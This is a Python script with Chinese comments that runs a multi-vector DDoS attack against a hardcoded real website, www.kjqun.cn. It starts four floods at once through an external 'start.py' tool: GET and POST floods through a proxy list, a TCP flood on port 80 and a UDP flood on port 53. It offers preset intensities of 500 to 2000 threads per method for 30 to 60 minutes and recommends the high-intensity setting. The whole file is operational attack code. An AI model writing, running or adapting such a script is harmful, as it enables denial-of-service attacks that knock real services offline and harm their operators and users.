#!/usr/bin/env python3
"""
多重DDoS攻击脚本 - 解决PowerShell后台运行问题
可以同时运行多种攻击方法，无需使用&符号
"""

import subprocess
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor

class MultiDDoSAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.domain = target_url.replace('https://', '').replace('http://', '').split('/')[0]
        self.attack_processes = []
        
    def run_attack_command(self, command, attack_name):
        """运行单个攻击命令"""
        print(f"🚀 启动{attack_name}攻击...")
        print(f"📝 命令: {command}")
        
        try:
            # 使用subprocess运行命令
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # 记录进程
            self.attack_processes.append((process, attack_name))
            
            # 非阻塞读取输出
            def read_output():
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        print(f"[{attack_name}] {output.strip()}")
            
            # 启动输出读取线程
            output_thread = threading.Thread(target=read_output)
            output_thread.daemon = True
            output_thread.start()
            
            print(f"✅ {attack_name}攻击已启动")
            return process
            
        except Exception as e:
            print(f"❌ {attack_name}攻击启动失败: {e}")
            return None
    
    def start_multi_attack(self, threads_per_method=500, duration=1800):
        """启动多重攻击"""
        print("="*60)
        print("💥 多重DDoS攻击启动")
        print("="*60)
        print(f"🎯 目标: {self.target_url}")
        print(f"⚡ 每方法线程数: {threads_per_method}")
        print(f"⏱️ 持续时间: {duration}秒 ({duration//60}分钟)")
        print("-"*60)
        
        # 定义多种攻击方法
        attack_commands = [
            {
                'name': 'GET方法(Layer7)',
                'command': f'python start.py GET {self.target_url} 0 {threads_per_method} proxies.txt {threads_per_method} {duration}'
            },
            {
                'name': 'POST方法(Layer7)', 
                'command': f'python start.py POST {self.target_url} 0 {threads_per_method} proxies.txt {threads_per_method} {duration}'
            },
            {
                'name': 'TCP方法(Layer4)',
                'command': f'python start.py TCP {self.domain}:80 {threads_per_method} {duration}'
            },
            {
                'name': 'UDP方法(Layer4)',
                'command': f'python start.py UDP {self.domain}:53 {threads_per_method} {duration}'
            }
        ]
        
        # 启动所有攻击
        print("🔧 正在启动所有攻击方法...")
        
        for attack in attack_commands:
            self.run_attack_command(attack['command'], attack['name'])
            time.sleep(2)  # 短暂延迟避免冲突
        
        print(f"✅ 所有攻击方法已启动，总共 {len(attack_commands)} 种攻击")
        print(f"📊 总攻击线程数: {threads_per_method * len(attack_commands)}")
        
        # 监控攻击状态
        self.monitor_attacks(duration)
    
    def monitor_attacks(self, duration):
        """监控攻击状态"""
        print("\n📊 开始监控攻击状态...")
        
        start_time = time.time()
        end_time = start_time + duration
        
        while time.time() < end_time:
            elapsed = int(time.time() - start_time)
            remaining = int(end_time - time.time())
            
            # 检查进程状态
            active_count = 0
            for process, name in self.attack_processes:
                if process.poll() is None:  # 进程仍在运行
                    active_count += 1
            
            print(f"⏰ 已运行: {elapsed//60}分{elapsed%60}秒 | 剩余: {remaining//60}分{remaining%60}秒 | 活跃攻击: {active_count}/{len(self.attack_processes)}")
            
            # 每30秒报告一次
            time.sleep(30)
        
        # 攻击结束
        print("\n🛑 攻击时间结束，正在停止所有攻击...")
        self.stop_all_attacks()
    
    def stop_all_attacks(self):
        """停止所有攻击"""
        for process, name in self.attack_processes:
            if process.poll() is None:  # 进程仍在运行
                try:
                    process.terminate()
                    print(f"🛑 已停止{name}攻击")
                except:
                    print(f"❌ 停止{name}攻击失败")
        
        print("✅ 所有攻击已停止")
    
    def start_high_intensity_attack(self):
        """启动高强度攻击（推荐）"""
        print("💥 启动高强度多重DDoS攻击")
        print("🎯 配置: 1000线程/方法，30分钟持续时间")
        
        self.start_multi_attack(threads_per_method=1000, duration=1800)
    
    def start_extreme_attack(self):
        """启动极限强度攻击"""
        print("💥💥 启动极限强度多重DDoS攻击")
        print("🎯 配置: 2000线程/方法，60分钟持续时间")
        
        self.start_multi_attack(threads_per_method=2000, duration=3600)

def main():
    target = "https://www.kjqun.cn/"
    
    # 创建攻击实例
    attacker = MultiDDoSAttack(target)
    
    print("请选择攻击强度:")
    print("1. 标准强度 (500线程/方法，30分钟)")
    print("2. 高强度 (1000线程/方法，30分钟) - 推荐")
    print("3. 极限强度 (2000线程/方法，60分钟)")
    
    try:
        choice = input("请输入选择 (1/2/3, 默认2): ").strip()
        
        if choice == "1":
            attacker.start_multi_attack(threads_per_method=500, duration=1800)
        elif choice == "3":
            attacker.start_extreme_attack()
        else:
            attacker.start_high_intensity_attack()
            
    except KeyboardInterrupt:
        print("\n🛑 用户中断，正在停止攻击...")
        attacker.stop_all_attacks()
    except Exception as e:
        print(f"❌ 错误: {e}")

if __name__ == "__main__":
    main()